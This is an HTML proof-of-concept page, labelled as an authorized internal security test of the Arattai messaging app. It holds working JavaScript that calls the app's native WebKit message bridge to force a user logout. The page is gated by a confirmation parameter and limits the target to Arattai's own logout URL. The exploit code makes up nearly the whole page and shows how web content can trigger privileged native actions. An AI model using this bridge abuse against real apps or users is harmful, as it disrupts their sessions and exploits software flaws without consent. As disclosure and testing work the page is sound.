<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Arattai forced-logout PoC (authorized security test)</title>
</head>
<body style="font-family:-apple-system,sans-serif;max-width:640px;margin:60px auto;text-align:center">
  <h2>Forced-logout security test</h2>
  <p id="status">Validation pending...</p>
  <p style="color:#b00;font-weight:bold">SECURITY TEST ARTIFACT — authorized internal PoC only.<br>Do not enter real credentials on any page reached from here.</p>

<script>
const status = document.getElementById("status");
const params = new URLSearchParams(location.search);
const confirmation = params.get("confirm");
const fragmentTarget = location.hash.length > 1 ? decodeURIComponent(location.hash.slice(1)) : "";
const requestedTarget = fragmentTarget || params.get("target") || "https://web.arattai.in/logout.sas";

let logoutURL;
try {
  logoutURL = new URL(requestedTarget);
} catch (error) {
  status.innerText = "Blocked: invalid target URL.";
}

const isArattaiHost = logoutURL &&
  (logoutURL.hostname === "arattai.in" || logoutURL.hostname.endsWith(".arattai.in"));
const isExactLogoutPath = logoutURL && logoutURL.pathname === "/logout.sas";

if (confirmation !== "authorized-staging-test") {
  status.innerText = "Not armed. Add ?confirm=authorized-staging-test to run the bounded test.";
} else if (!logoutURL || logoutURL.protocol !== "https:" || !isArattaiHost || !isExactLogoutPath) {
  status.innerText = "Blocked: target must be https://*.arattai.in/logout.sas.";
} else {
  try {
    window.webkit.messageHandlers.arattai.postMessage({
      c: "__trace__",
      a: { stage: "NETWORK-POC-FORCED-LOGOUT", detail: "caller=" + location.origin }
    });
    window.webkit.messageHandlers.arattai.postMessage({
      c: "do-logout",
      a: { logout_url: logoutURL.href, re_login_url: "" }
    });
    status.innerText = "PoC fired. The native app should load the legitimate Arattai logout endpoint.";
  } catch (error) {
    status.innerText = "Bridge not reachable from this frame: " + error;
  }
}
</script>
</body>
</html>
